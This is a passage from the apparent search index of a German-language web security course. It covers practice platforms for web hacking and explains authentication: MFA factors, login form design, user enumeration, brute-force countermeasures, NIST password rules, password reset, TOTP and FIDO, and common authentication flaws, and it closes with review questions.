werden.</p>"},{"location":"appendix/weitere-informationen/#what-to-hack","title":"What to hack?","text":"<p>Web Security kann nicht ausschlie\u00dflich theoretisch gelehrt werden, wenn man in dem Umfeld aktiv sein will muss man hands-on Praxisbeispiele sehen und auch versuchen. Das Gef\u00fchl, bei einer Web-Applikation permanent mit dem Kopf gegen die Wand zu laufen, immer weider neue Angriffe erfolglos zu versuchen bis man einen funktionierenden Angriff gefunden, und sich nach erfolgter Ausnutzung zufrieden zur\u00fccklehnen kann, kann nur erlebt werden. Gl\u00fcckerlicher Weise gibt es mittlerweile eine Vielzahl an gratis bzw. freemium-basierten Webangeboten welche genau diese Gelegenheit bieten.</p> <p>Eine Auflistung dieser kann in folgender Tabelle vorgefunden werden[7]. Die Spalten ,,online\u201d, ,,VPN\u201d und ,,VM\u201d sollten darstellen, wie das jeweilige Angebot genutzt werden kann. ,,Online\u201d sind Kurse, bei denen eine verwundbare Webapplikation direkt \u00fcber den Browser des Benutzers getestet werden kann: es muss nicht zwingend am lokalen Rechner eine Virtualisierungsl\u00f6sung oder \u00e4hnliches installiert werden. L\u00f6sungen der Spalte ,,VM\u201d sind das genaue Gegenteil: hier kann zumeist eine virtuelle Maschine bezogen und lokal installiert werden. In dieser virtuellen Maschine befindet sich die zu testende Software. In diesem Fall ben\u00f6tigt man zwar lokal installierte Virtualisierungssoftware, ist daf\u00fcr allerdings von der Internet-/Netzwerkverbindungsqualit\u00e4t gro\u00dfteils unabh\u00e4ngig. ,,VPN\u201d-L\u00f6sungen sind eine Mischform: bei diesen erh\u00e4lt man Zugangsdaten f\u00fcr einen VPN-Einwahlknoten und gelangt \u00fcber diesen zu einem virtuellen Labornetzwerk in welchem sich virtuelle Maschinen mit verwundbarer Software befinden. In diesem Fall muss man zwar lokal einen VPN-Client installieren, diese ist allerdings leichtgewichtiger als eine volle Virtualisierungsl\u00f6sung. Zus\u00e4tzlich bieten ,,VPN\u201d-basierte Ans\u00e4tze auch teilweise gr\u00f6\u00dfere Netzwerke in denen man auch Post-Exploitation T\u00e4tigkeiten wie Lateral Movement trainieren kann.</p> Name auch kommerziell Online VPN VM Web Security Academy ja x Vulnhub nein x Pentester lab ja x x Hack the Box ja x <p>Online-Angebote f\u00fcr Hacking-,,Praxisbeispiele\u201d</p> <p>Im Scope unterscheiden sich die gelisteten L\u00f6sungen ebenso. W\u00e4hrend Web Security Academy und Pentester Lab sich an Security-Schulungen anlehnen und Theorie bzw. Hintergrundinformationen bieten, steht bei VulnHub und Hack the Box das ,,Doing\u201d, also das Hacken von Maschinen, im Vordergrund. Die beiden letztgenannten Plattformen bieten weniger Hintergrundinformationen, diese k\u00f6nnen aber im Normalfall durch Suche im Internet gefunden werden.</p>"},{"location":"appendix/weitere-informationen/#what-to-attend","title":"What to attend?","text":"<p>OWASP selbst ist in St\u00e4dte-zentrische Chapters organisiert, ich bin zum Beispiel bei dem OWASP Chapter Klagenfurt (Austria) aktiv.</p> <p>[7] Ich habe mich bei dieser Liste auf Angebote welche, zumindest teilweise, gratis nutzbar sind, beschr\u00e4nkt, daher fehlt hier z.B. Offensive Security obwohl diese von mir hoch gesch\u00e4tzt werden.</p>"},{"location":"authentication-and-authorization/authentication/","title":"Authentifikation","text":"<p>Sobald eine Webapplikation sensitive bzw. privilegierte Operationen und Daten bereitstellt, besteht die Notwendigkeit die Identit\u00e4t des zugreifenden Benutzers zu erheben und zu verifizieren.</p> <p>Authentifikation kann als die Verifikation einer behaupteten Benutzeridentit\u00e4t \u00fcber zuvor ausgetauschte Details (wie z.B. das w\u00e4hrend der Registrierung angegebenen Passwort) definiert werden. Nach erfolgtem Login wird zumeist eine langfristige Verbindung (Session) zu dem Benutzer aufgebaut. Bei Folgezugriffen wird dieses Vertrauensverh\u00e4ltnis verwendet, um den Benutzer sowohl zu identifizieren als auch authentifizieren.</p>"},{"location":"authentication-and-authorization/authentication/#identifikation-und-authentifikation","title":"Identifikation und Authentifikation","text":"<p>Bei der Identifikation claimed der Benutzer seine Identit\u00e4t, z.B. durch Angabe eines zuvor registrierten Benutzernamens. Weitere M\u00f6glichkeiten w\u00e4ren z.B. SmartCards oder biometrische Methoden. Die Identifikation wird zumeist mit einer Authentifikation kombiniert.</p> <p>Die Authentifikation dient zur Validierung der behaupteten Identit\u00e4t des Benutzers. Es gibt mehrere M\u00f6glichkeiten (Faktoren) \u00fcber welche ein Benutzer seine Identit\u00e4t authentifizieren kann, folgende Tabelle gibt eine kurze \u00dcbersicht h\u00e4ufig genutzter Faktoren:</p> Faktor Art Passwort Something you know Hardware-Tokens something you have Biometrie something you are Soziale Beziehungen someone you know Email-Konto z.B. Slackanmeldung mittels Link in Email PostIdent Verifikation am Postamt mittels Ausweis VideoIdent Verifikation mit Ausweis mittels Videokonferenz PhotoIdent Verifikation \u00fcber zugeschicktes Ausweisbild <p>Bei der initialen Registrierung und bei nachfolgenden Anmeldungen k\u00f6nnen unterschiedliche Faktoren verwendet werden. Z. B. VideoIdent bei der Registrierung, bei Folgeanmeldungen Passw\u00f6rter.</p> <p>Durch die Kombination mehrere Faktoren erh\u00e4lt man eine Multifaktor-Authentifikation (MFA), h\u00e4ufig wird als Zweifaktoren-Authentifikation (2FA) ein Passwort mit einem Token kombiniert. Wichtig bei der MFA ist die Wahl von Faktoren aus unterschiedlichen Klassen. Es macht z.B. wenig Sinn eine Fingerprint-Authentifikation mit einer Iris-Authentifikation zu kombinieren. Ein sch\u00f6nes Beispiel, bei dem Faktoren verschiedener Klassen schlecht durch einen User kombiniert werden w\u00e4re es, wenn der Benutzer einer Bankomatkarte seinen PIN (something you know) auf seine Bankomatkarte (something you have) schreibt.</p>"},{"location":"authentication-and-authorization/authentication/#login-und-logout","title":"Login- und Logout","text":"<p>Wenn ein Login- und Logout innerhalb der Applikation implementiert werden, m\u00fcssen gewisse Grundfunktionen abgedeckt sein.</p>"},{"location":"authentication-and-authorization/authentication/#login-formular","title":"Login-Formular","text":"<p>Das Login-Formular sollte entsprechend dem KISS-Prinzip als einfaches HTML-Formular implementiert werden. Hauptgrund daf\u00fcr ist, dass das Login-Formular mit Passwort-Managern kompatibel sein sollte. Dies impliziert, dass das Login-Formular aus Textfeldern f\u00fcr Benutzername und Passwort als auch einem Login-Button bestehen sollte.</p> <p>Negative Beispiele die den Einsatz von Passwort-Managern erschweren:</p> <ul> <li> <p>Benutzername und Passwort-Feld sind nicht innerhalb der gleichen   Seite</p> </li> <li> <p>Password-Feld wird erst angezeigt, nachdem ein Benutzername   eingegeben wurde</p> </li> <li> <p>Verwendung von Flash-, Silverlight- oder Java-Applets</p> </li> <li> <p>Authentication through EMail a la Slack (Email mit Best\u00e4tigungslink   dient als Passwortersatz)</p> </li> <li> <p>HTTP BASIC basierte Authentifikation</p> </li> </ul>"},{"location":"authentication-and-authorization/authentication/#user-enumeration-angriffe","title":"User Enumeration Angriffe","text":"<p>Eine User Enumeration liegt vor, wenn ein Angreifer gezielt Informationen \u00fcber das Vorhandensein eines Benutzers erzielen kann. Zumeist geschieht dies \u00fcber schlecht gew\u00e4hlte Fehlermeldungen. So kann ein Angreifer bei der Fehlermeldung \u201cPasswort invalid\u201d davon ausgehen, dass ein Benutzername dem System bekannt ist. L\u00f6sung: Verwendung generischer Fehlermeldungen wie \u201cBenutzer/Passwort-Kombination nicht bekannt\u201d.</p> <p>W\u00e4hrend dies bei einem Login-Formular leicht zu bewerkstelligen ist, sind weitere Operationen komplexer:</p> <ul> <li> <p>\u201cPasswort vergessen\u201d-Funktion: hier muss meistens eine Email-Adresse   angegeben werden. Falls die Email-Adresse dem System nicht bekannt   ist, sollte keine Fehlermeldung ausgegeben werden, sondern ein   Hinweis, dass an die angegebene Email eine Benachrichtigungsemail   versendet wurde.</p> </li> <li> <p>Bereits vorhandene Email-Adresse bei Registrierung: hier sollte   ebenso eine neutrale Erfolgsmeldung innerhalb der Webseite   ausgegeben, und anschlie\u00dfend in einer Best\u00e4tigungsemail der Benutzer   darauf hingewiesen werden, dass er bereits ein Konto mit der   Email-Adresse angelegt hatte.</p> </li> <li> <p>Bereits vorhandener Login bei Registrierung: hier muss dem User eine   Fehlermeldung angezeigt werden.</p> </li> </ul> <p>Generell ist dieser Bereich einer derjenigen, bei denen Usability und Security potentiell kontr\u00e4re Ziele besitzen.</p>"},{"location":"authentication-and-authorization/authentication/#brute-force-angriffe-gegen-login-formular","title":"Brute-Force Angriffe gegen Login-Formular","text":"<p>Brute-Force Angriffe versuchen mittels automatisierter Anfragen eine valide Kombination von Benutzernamen und Passwort zu erraten. Durch die Kenntnis bekannter Benutzernamen k\u00f6nnen Brute-Force Angriffe beschleunigt werden (z.B. durch eine zu vorige User Enumeration).</p> <p>Technisch sind Brute-Force Angriffe einfach umzusetzen, Tool-Support ist massiv vorhanden. Die erreichte Geschwindigkeit befindet sich meistens bei mehreren Zehntausend Versuchen pro Stunde.</p> <p>Brute-Force Angriffe versuchen entweder eine Kombination des gesamten Testbereichs (Buchstaben, Zahlen, Sonderzeichen) oder verwenden vorbereitete Passwortlisten. Diese k\u00f6nnen auf verschiedene Arten bereitgestellt werden:</p> <ul> <li> <p>Sammlung von Passw\u00f6rtern von etwaigen Password Leaks.</p> </li> <li> <p>Automatisch generierte Liste basierend auf den \u00f6ffentlichen Seiten   der zu testenden Homepage.</p> </li> <li> <p>Deep-Learning basierte Verfahren, die basierend auf existierenden   Passwortlisten neue Passwortlisten generieren.</p> </li> </ul> <p>Gegenma\u00dfnahmen zielen auf eine Verlangsamung des Angriffs bzw. auf eine Sperre betroffener Konten ab:</p> <ul> <li> <p>Rate-Limits bzw. Verlangsamung bei Fehlerseiten.</p> </li> <li> <p>Sperre von Benutzeraccounts bzw. IP-Adressen nach einer definierten   Anzahl von Fehlversuchen.</p> </li> <li> <p>Einsatz einer Mehrfaktorauthentication. Durch die ben\u00f6tigte manuelle   Interaktion wird eine Brute-Force Attacke ausgebremst. Hier ist die   Wahl eines geeigneten Faktors und eine geeignete Integration   notwendig.</p> </li> </ul>"},{"location":"authentication-and-authorization/authentication/#logout","title":"Logout","text":"<p>Symmetrisch zum Login sollte auch eine Logout-Operation implementiert werden. Dadurch kann der Benutzer seine Session beenden und dadurch das m\u00f6gliche verwendbare Zeitfenster gegen\u00fcber Angriffen (z.B. gegen\u00fcber CSRF-Angriffen) verkleinern.</p> <p>Bei neueren Standards wie der \u00d6NORM A77.00 gibt es die Anforderung, dass der Benutzer nicht nur seine aktuelle, sondern auch alle seine bestehenden Sitzungen beenden kann.</p> <p>Beispiel: Benutzer besitzt einen Desktop und einen Laptop. Der Laptop wird gestohlen, es sollte m\u00f6glich sein eine offene Web-session am Laptop \u00fcber den Desktop zu beenden.</p>"},{"location":"authentication-and-authorization/authentication/#deaktivierensperrenloschen-von-accounts","title":"Deaktivieren/Sperren/L\u00f6schen von Accounts","text":"<p>Wird ein Benutzeraccount gel\u00f6scht oder deaktiviert stellt sich die Frage, wie mit den gel\u00f6schten Daten des Benutzers umzugehen ist. Wurde ein Account gesperrt muss daf\u00fcr Sorge getragen werden, dass:</p> <ul> <li> <p>bereits ausgestellte Recovery-Codes den Account nicht reaktivieren   k\u00f6nnen</p> </li> <li> <p>aktive Benutzersessions beendet werden</p> </li> <li> <p>der Benutzer sich nicht mehr einloggen kann</p> </li> </ul> <p>Die Hauptfrage bei einem zu l\u00f6schenden Account ist, welche Daten gel\u00f6scht, und welche Daten persistiert werden m\u00fcssen (beides prim\u00e4r aus rechtlichen Gr\u00fcnden).</p>"},{"location":"authentication-and-authorization/authentication/#behandlung-von-passwortern","title":"Behandlung von Passw\u00f6rtern","text":"<p>Die grunds\u00e4tzliche Strategie w\u00e4re, keine Passw\u00f6rter in der Applikation zu speichern, einzugeben oder zu verarbeiten. Wenn die Applikation niemals Zugriff auf Passw\u00f6rter hat, k\u00f6nnen diese auch nicht verloren werden. Falls dies nicht m\u00f6glich ist, m\u00fcssen beim Umgang mit Passw\u00f6rtern gewisse Grundregeln eingehalten werden.</p> <p>Genauere Informationen zur sicheren Speicherung von Passw\u00f6rtern k\u00f6nnen im Kapitel Sensitive Data Exposure gefunden werden.</p> <p>Prinzipiell k\u00f6nnen Angriffe gegen Passw\u00f6rter in drei Kategorien eingeteilt werden:</p> <ol> <li> <p>Disclosure tritt auf, wenn das Passwort unbeabsichtigt    \u201cver\u00f6ffentlicht\u201d wird. Dies kann z.B. durch Notizzettel, Wikis oder    auch durch phishing geschehen.</p> </li> <li> <p>Online Attacks sind Angriffe gegen\u00fcber einem Login-System. Diese    k\u00f6nnen durch das Websystem erkannt werden.</p> </li> <li> <p>Offline Attacks sind Angriffe gegen\u00fcber geleakten Passwort-Hashes.    Diese k\u00f6nnen durch das Websystem nicht erkannt werden.</p> </li> </ol>"},{"location":"authentication-and-authorization/authentication/#passwort-qualitat","title":"Passwort-Qualit\u00e4t","text":"<p>Kann ein neues Passwort in der Applikation gesetzt werden, sollte dieses gewisse Mindestanforderungen erf\u00fcllen. 2018 wurden die NIST 800-63-3: Digital Identity Guidelines ver\u00f6ffentlicht, diese inkludieren mehrere Best-Pracises im Umgang mit Passw\u00f6rtern:</p> <ul> <li> <p>Minimale Passwortl\u00e4nge: 8 Zeichen. Ein Unicode Zeichen ist ein   Zeichen.</p> </li> <li> <p>Falls ein Benutzer ein l\u00e4ngeres Passwort eingibt, m\u00fcssen mindestens   64 Zeichen gespeichert werden.</p> </li> <li> <p>Das periodische Neusetzen von Passw\u00f6rtern wird nicht mehr gefordert.   Diese Ma\u00dfnahme bewirkte schw\u00e4chere Passw\u00f6rter.</p> </li> <li> <p>Komplexit\u00e4tsregeln bei Passw\u00f6rtern (mindestens ein Sonderzeichen und   \u00e4hnliches) wurden entfernt.</p> </li> <li> <p>Neu eingegebene Passw\u00f6rter m\u00fcssen gegen eine Liste von bekannten   Passwort-Leaks und gegen bekannte Standard bzw. h\u00e4ufig genutzte   Passw\u00f6rter getestet werden.</p> </li> <li> <p>Passwort-Hints d\u00fcrfen nicht mehr verwendet werden.</p> </li> </ul> <p>Um eingegebene Passw\u00f6rter gegen eine Liste von geleakten Passw\u00f6rtern zu \u00fcberpr\u00fcfen, kann z.B. von Have I Been Pwned eine ca. 10 Gigabyte gro\u00dfe Liste an Passwort-Hashes heruntergeladen werden. Alternativ bietet haveibeenpwned einen Passwort-Check Service an. Bei diesem werden Passw\u00f6rter nicht als Hash \u00fcbermittelt (ansonsten w\u00fcrde der Serverbetreiber Wissen \u00fcber die verwendeten Passw\u00f6rter erhalten), sondern es wird das Passwort gehashed, die ersten 5 Zeichen des Hashes \u00fcbertragen und anschlie\u00dfend eine Liste aller gefundenen Hashes an den Client zur\u00fcck \u00fcbertragen.</p>"},{"location":"authentication-and-authorization/authentication/#passwort-reset","title":"Passwort-Reset","text":"<p>Ein wichtiger Grundsatz ist Account recovery not password recovery. Dieser sagt aus, dass der Benutzer wieder Zugang zu seinem Account erh\u00e4lt, aber nicht sein bestehendes Passwort einsehen kann. In einer korrekt implementierten Applikation sollte das bestehende Passwort nirgends unverschl\u00fcsselt gespeichert werden, daher sollte diese M\u00f6glichkeit prinzipiell nicht technisch m\u00f6glich sein.</p> <p>Meistens wird man aus Gr\u00fcnden der Usability dem User eine M\u00f6glichkeit des Passwort-Resets geben. Dies wird normalerweise \u00fcber eine Email mit einem Passwort-Reset Link implementiert. Folgende Implementierungshinweise:</p> <ul> <li> <p>Dem User sein bestehendes Passwort zuzusenden ist ein epic fail da   hierf\u00fcr das Passwort unverschl\u00fcsselt gespeichert werden m\u00fcsste.</p> </li> <li> <p>Dem Benutzer ein neues Passwort per Email zuzuschicken sollte   vermieden werden.</p> </li> <li> <p>Der generierte Link sollte nur einmalig verwendbar sein, und auch   nur das Updaten des aktuellen (vergessenen) Passworts erlauben.</p> </li> <li> <p>der generierte Link sollte nur f\u00fcr den betreffenden User verwendbar   sein.</p> </li> </ul> <p>Hinweis: die aktuellen NIST Richtlinien verbieten explizit die Verwendung von \u201cPasswort Fragen\u201d (\u201cIn welcher Stra\u00dfe bist du aufgewachsen, etc.\u201d) zum Zur\u00fccksetzen des Passworts. Grund: diese Fragen waren bei bekannteren Personen einfach nachzuforschen.</p> <p>Die Verifikation kann auch \u00fcber Alternate Transports geschehen. Ein Beispiel w\u00e4re die \u00f6sterreichische Sozialversicherung, bei der ein neues Passwort \u00fcber einen eingeschriebenen Brief an den User verschickt wird. Dadurch wird eine Identit\u00e4tsfeststellung des Empf\u00e4ngers erzwungen.</p> <p>Sobald ein neues Passwort gesetzt wurde sollte der Benutzer \u00fcber mehrere Wege \u00fcber diese Passwort\u00e4nderung notifiziert, und ihm eine M\u00f6glichkeit der Account-Sperre gegeben, werden. Typische Nachrichtenwege w\u00e4ren z.B. Emails oder SMS.</p>"},{"location":"authentication-and-authorization/authentication/#andern-von-passwortern","title":"\u00c4ndern von Passw\u00f6rtern","text":"<p>Der Benutzer sollte die M\u00f6glichkeit besitzen, sein Passwort neu zu setzen. F\u00fcr eine sichere Operation muss folgendes gegeben sein:</p> <ul> <li> <p>der User muss aktuell authenticated sein</p> </li> <li> <p>der Benutzer kann nur sein eigenes Passwort \u00e4ndern</p> </li> <li> <p>im Zuge der Operation, die das neue Passwort setzt, muss auch das   alte Passwort erfragt werden.</p> </li> </ul> <p>Das bestehende Password wird erfragt, damit ein Angreifer mit Zugriff auf die Session nicht ein neues Passwort setzen kann (und dadurch unbegrenzten Zugriff auf das Benutzerkonto erh\u00e4lt). Im einfachsten Fall geschieht so ein Angriff indem der Angreifer auf einem nicht-gesperrten Computer ein neues Passwort innerhalb einer eingeloggten Webapplikation eingibt.</p> <p>Damit diese Schutzma\u00dfnahme funktioniert, m\u00fcssen sowohl das alte als auch das neue Passwort im gleichen Schritt \u00fcbermittelt werden. Ebenso verhindert dies CSRF-basierte Angriffe.</p>"},{"location":"authentication-and-authorization/authentication/#passworter-fur-dritt-dienste","title":"Passw\u00f6rter f\u00fcr Dritt-Dienste","text":"<p>Teilweise k\u00f6nnen Passw\u00f6rter nicht gehashed innerhalb der Applikation gespeichert werden. Dies tritt zum Beispiel auf, wenn das Passwort an eine Drittapplikationen weitergegeben werden muss \u2013 eine Webapplikation welche zur Darstellung eines IMAP-Emailkontos dient muss z.B. innerhalb der Applikation die Zugangsdaten f\u00fcr das externe Email-System speichern. Falls dieser Email-Server das Passwort in plain-text ben\u00f6tigt, muss die Applikation nun auch das Passwort in plain-text speichern und kann daher keine Einweg-Hashfunktion anwenden.</p> <p>Prinzipiell ist hier das Grundproblem, dass das sensible Passwort an eine externe, potentiell nicht vertrauensw\u00fcrdige, Applikation \u00fcbergeben werden muss.</p>"},{"location":"authentication-and-authorization/authentication/#alternativen-zu-passwort-basierten-logins","title":"Alternativen zu Passwort-basierten Logins","text":"<p>Benutzer sind notorisch schlecht bei der Wahl sicherer Passw\u00f6rter. Um diese Gefahrenquelle zu minimieren wird versucht, entweder die Sicherheit des Login-Vorgangs mit einem zweiten Faktor zu verst\u00e4rken, oder Passw\u00f6rter vollkommen durch physikalische Tokens zu ersetzen.</p> <p>TOTP ist ein Verfahren, dass zur Implementierung eines zweiten Faktors eingesetzt werden kann. Im Gegensatz dazu, werden die Protokolle der FIDO-Allianz h\u00e4ufig f\u00fcr die Implementierung Passwort-loser Authentifizierungsvorg\u00e4nge genutzt.</p>"},{"location":"authentication-and-authorization/authentication/#totp","title":"TOTP","text":"<p>Time-based One-Time Passwords (TOTP, RFC 6238) ist ein h\u00e4ufig verwendetes Verfahren zur Implementierung eines weiteren Authentication-Faktors. Es ist ein Zusammenspiel zwischen Authenticator (meist eine mobile Applikation) und einer Webapplikation.</p> <p>Initial wird ein shared secret key zwischen Authenticator und Webapplikation ausgetauscht. Wird nun eine Authentifikation ben\u00f6tigt wird nun auf beiden Seiten die aktuelle Systemzeit (in Sekunden seit Beginn der UNIX Epoche) auf 30 Sekunden gerundet und ein MAC (unter Zuhilfenahme des shared secret keys) gebildet. Dieser MAC wird nun auf 31 bit gek\u00fcrzt und in einen 6 oder 8 stelligen Zahlencode verwandelt. Dieser wird am Authenticator angezeigt und muss vom User in der Webapplikation als weiterer Faktor eingegeben werden. Sofern beide berechnete Werte ident sind, wird die Authentifikation erfolgreich durchgef\u00fchrt.</p> <p>Ein Vorteil dieses Verfahrens ist, dass nach dem initialen Schl\u00fcsselaustausch keine Netzwerkverbindung zwischen Authenticator und Applikation ben\u00f6tigt wird. Ein Nachteil ist, dass die Systemuhren der betroffenen Systeme synchronisiert werden m\u00fcssen. Ebenso kann bei TOTP kein device-binding durchgef\u00fchrt werden: die Webapplikation kann nicht feststellen, auf wie vielen devices ein TOTP-Secret eingespielt wurde. Ebenso ist der Vorgang der initialen Secret-Verteilung gef\u00e4hrlich: wird hier z.B. von einem Benutzer ein Selfie inklusive dem QR-Code/Secret-Code erstellt und ver\u00f6ffentlicht, wurde auf diese Weise die gesamte Sicherheit des Verfahrens kompromittiert.</p>"},{"location":"authentication-and-authorization/authentication/#protokolle-der-fido-alliance","title":"Protokolle der FIDO-Alliance","text":"<p>Die FIDO-Alliance ist eine nicht-kommerzielle Vereinigung von \u00fcber 150 Unternehmen und Beh\u00f6rden mit dem Ziel, offene und lizenzfreie Authentifizierung-Industriestandards zu schaffen. Ihre Mitglieder beinhalten u.a. Alibaba, Google, Microsoft, Samsung und YubiCo. Die Abk\u00fcrzung FIDO steht dabei f\u00fcr Fast IDentity Online.</p> <p>Ende 2014 wurde FIDO 1.0 ver\u00f6ffentlicht, dieser Standard umfasste:</p> <ul> <li> <p>U2F (Universal Second Factor) standardisiert den Einsatz von   physikalischen Tokens (wie z.B. einem Yubikey). Sofern die   Webapplikation und der verwendete Webbrowser U2F unterst\u00fctzen kann   der Benutzer sich mit einem Hardware-Token authentifizieren (z.B.   durch Knopfdruck auf einem USB-Stick oder durch Antappen eines   NFC/BLE Tokens).</p> </li> <li> <p>UAF (Universal Authentication Framework) dient zur Implementierung   eines Passwort-losen Logins. Der Benutzer muss \u00fcber ein   UAF-kompatibles Endger\u00e4t verf\u00fcgen (z.B. Windows 10) und registriert   quasi sein Endger\u00e4t bei der Webapplikation.</p> </li> </ul> <p>Das Grundprinzip basiert auf public key Kryptographie. Wenn ein Authenticator (z.B. Android Ger\u00e4t) als Ger\u00e4t eines Benutzers registriert wird, wird im Ger\u00e4t ein public/private key pair generiert und der public key dem FIDO Server mitgeteilt. Im Falle einer Benutzerauthentication wird die Anfrage des Servers vom Client mit dem private key signiert, mit dem serverseitig hinterlegten public key verglichen und damit die Identit\u00e4t des Benutzers verifiziert. Lokal werden meistens biometrische Methoden zum Schutz der Tokens verwendet.</p> <p>FIDO2 kombiniert mehrere Projekte um eine passwortlose Authentication zu erlauben. Das vom W3C standardisierte WebAuthn wird von Webbrowsern implementiert und erlaubt es Webapplikationen (mittels JavaScript) eine FIDO Benutzerauthentication durchzuf\u00fchren. Das Client-to-Authenticator-Protocol (CTAP) standardisiert das Kommunikationprotokoll zwischen Authenticator (Hardware-Tokens) und dem Webbrowser (Client). Es gibt zwei Varianten CTAP1 und CTAP2 wobei CTAP1 dem FIDO U2F Standard entspricht.</p>"},{"location":"authentication-and-authorization/authentication/#gegenuberstellung-fidototp","title":"Gegen\u00fcberstellung FIDO/TOTP","text":"<p>Wird FIDO mit TOTP verglichen, k\u00f6nnen konzeptionelle Unterschiede erkannt werden:</p> <ul> <li> <p>FIDO1/2 \u00fcbertr\u00e4gt nur einen \u00f6ffentlichen Schl\u00fcssel w\u00e4hrend der   Registrierung eines neuen Authenticators. TOTP \u00fcbertr\u00e4gt ein shared   secret. Bei FIDO verl\u00e4sst der geheime Schl\u00fcssel niemals den   Authenticator.</p> </li> <li> <p>TOTP ben\u00f6tigt im Gegensatz zu FIDO w\u00e4hrend der Authentifizierung   keine aktive Netzwerkverbindung zwischen Authenticator und Service.   Stattdessen ben\u00f6tigt TOTP eine synchronisierte Systemzeit zwischen   allen beteiligten Parteien.</p> </li> <li> <p>Da bei FIDO der geheime Schl\u00fcssel nicht den Authenticator verl\u00e4sst,   gibt es ein Pairing zwischen dem Device und dem Service. Bei TOTP   kann ein Benutzer das idente shared secret mit mehreren   Authenticators verwenden, eine Zuordnung zu einem dedizierten   Authenticator ist daher nicht m\u00f6glich.</p> </li> <li> <p>TOTP besitzt keine Hardware-Requirements und kann daher gratis in   Software implementiert werden. W\u00e4hrend FIDO ein freier Standard ist,   setzt es einen Hardware-Token voraus \u2014 dadurch ist der Einsatz von   FIDO mit Hardware-Kosten verbunden und ist tendenziell nicht   \u201cgratis\u201d.</p> </li> </ul>"},{"location":"authentication-and-authorization/authentication/#authentication-von-operationen","title":"Authentication von Operationen","text":"<p>Um eine serverseitige Rechtekontrolle durchf\u00fchren zu k\u00f6nnen ist sowohl eine Benutzer-Identifikation, -Authentifikation und Authorization notwendig. Es muss sowohl die Benutzeridentit\u00e4t als auch dessen Berechtigung (Authorization) \u00fcberpr\u00fcft werden. Dies muss vor Exekution der aufgerufenen Operation serverseitig durchgef\u00fchrt werden.</p> <p>Da f\u00fcr jede \u00dcberpr\u00fcfung der Authorization eine Feststellung der Benutzeridentit\u00e4t notwendig ist, werden beide meistens zusammengefasst durchgef\u00fchrt. Ein wichtiger Unterschied ist, dass bei einem Fehler innerhalb der Authorization ein Angreifer eine Operation trotz fehlender Berechtigung aufrufen kann, dieser Aufruf allerdings einem bestehenden Benutzerkonto zugeordnet werden kann (audit/log trail). Bei Fehlern in der Authentifikation kann jeder anonyme Internetbenutzer auf die betroffenen Operationen und Daten zugreifen. Dies gilt auch f\u00fcr automatisierte Scantools, Search Bots und Crawler. Falls bei der Transportlevel-Sicherheit auch Fehler vorhanden sind, besteht ebenso gro\u00dfes Risiko durch Man-in-the-Middle Proxies (MitM-Proxies).</p>"},{"location":"authentication-and-authorization/authentication/#probleme-im-umfeld-der-authentication","title":"Probleme im Umfeld der Authentication","text":"<p>Das schwerwiegendste Problem w\u00e4re es, wenn keine Kontrolle der Authentication durchgef\u00fchrt wird. Nach einem Login kann jeder anonyme Benutzer auf alle Operationen und Daten zugreifen, eine Zuordnung der Operationsausf\u00fchrung zu einem eingeloggten Benutzer findet nicht statt. Prinzipiell handelt es sich hierbei um Security-by-Obscurity da die Sicherheit der Operationen und Daten nur davon abh\u00e4ngt, dass der Angreifer die URL der Operationen nicht kennt. Dies ist allerdings selten der Fall, da MitM-Proxies und Crawler zur Identifikation der Operationen verwendet werden k\u00f6nnen. Ebenso stellen die meisten API-Server automatisch generierte Dokumentation der bereitgestellten Operationen zur Verf\u00fcgung.</p> <p>In abgeschw\u00e4chter Form kann eine \u00e4hnliche Schwachstelle teilweise bei historisch gewachsenen Applikationen gefunden werden. Hier haben sich im Laufe der Zeit Technologietrends, Firmen-Guidelines oder Programmierteams ver\u00e4ndert und die Gesamtapplikation besteht aus Komponenten, die in verschiedenen Programmiersprachen/Frameworks implementiert wurden. Da Authentication-Daten zumeist \u00fcber das Framework abgehandelt werden, passiert es hier nun h\u00e4ufig, dass bei einem Teil der Applikationen die Authentication vergessen wird.</p> <p>Ein weiteres h\u00e4ufiges Problem sind selbst geschriebene Komponenten. \u00c4hnlich wie bei dem letzten Fehlerfall wird hier eine bestehende Applikation um eine weitere Funktion erweitert, auch hier kann dies zeit verz\u00f6gert durch neue Programmierer geschehen. Bei den neu geschriebenen Komponenten wird gerne auf die Authentication vergessen \u2014 eine m\u00f6gliche Ausrede w\u00e4re es, dass externe Programmierer eventuell das bestehende System nicht gut kennen.</p> <p>Beispiel: eine Kundenwebseite erlaubt den Download von Rechnungen. Die gesamte Webseite ist in JSP geschrieben, die Downloadseite allerdings in ASP.Net. Rechnungen k\u00f6nnen \u00fcber die URL /documents/download/123 bezogen werden. Bei Tests wurde festgestellt, dass \u00fcber freie Wahl der ID (Zahl) beliebige Kundenrechnungen heruntergeladen werden konnten, da keine Authentication implementiert wurde. Bei Analyse der Logdateien wurde weiters festgestellt, dass die betroffenen Daten bereits vom Google SearchBot indiziert wurden und somit im Suchindex aufgenommen waren.</p> <p>Gegenbeispiel: die Webseite eines Personentransportunternehmens verschickt eine Email mit einen Link auf das gekaufte Ticket. Beim Ticket-Download wird keine Authentication durchgef\u00fchrt, Begr\u00fcndung: bei der Kontrolle gab es immer wieder Probleme, dass Kunden ihr Ticket nicht herunterladen konnten da sie ihre Zugangsdaten vergessen hatten. Um das Risiko zu senken wurden als IDs gro\u00dfe Zufallszahlen gew\u00e4hlt.</p>"},{"location":"authentication-and-authorization/authentication/#reflektionsfragen","title":"Reflektionsfragen","text":"<ol> <li> <p>Was versteht man unter Multi-Faktor-Authentication?</p> </li> <li> <p>Wie funktionieren TOTP und FIDO U2F? Worin liegen konzeptionelle    Unterschiede?</p> </li> <li> <p>Welche Regeln sollten bei der Speicherung von Passw\u00f6rtern und zu der    Sicherung der Qualit\u00e4t der Passw\u00f6rter beachtet werden?</p> </li> <li> <p>Was ist der Unterschied zwischen Identification und Authentication?    Nenne zumindest vier Beispiele wie ein Benutzer identifiziert werden    kann.</p> </li> <li> <p>Wie sollte ein Login-Formular gestaltet sein? Von welchen Techniken    sollte man Abstand nehmen?</p> </li> <li> <p>Was ist eine User Enumeration und wie kann man sich dagegen    sch\u00fctzen? Was sind komplexere Applikationsfunktionen die schwer    gegen\u00fcber User Enumeration absicherbar sind?</p> </li> <li> <p>Was sind Brute-Force Angriffe und wie werden die dabei verwendeten    Daten erzeugt? Welche Gegenma\u00dfnahmen gibt es?</p> </li> <li> <p>Auf welche Gefahren sollten bei der Implementierung der    Passwort-Vergessen Funktion geachtet werden?</p> </li> </ol>"},{"location":"authentication-and-authorization/authorization/","title":"Authorization","text":"<p>Unter Authorization versteht man die Kontrolle der Benutzerrechte vor der Ausf\u00fchrung der 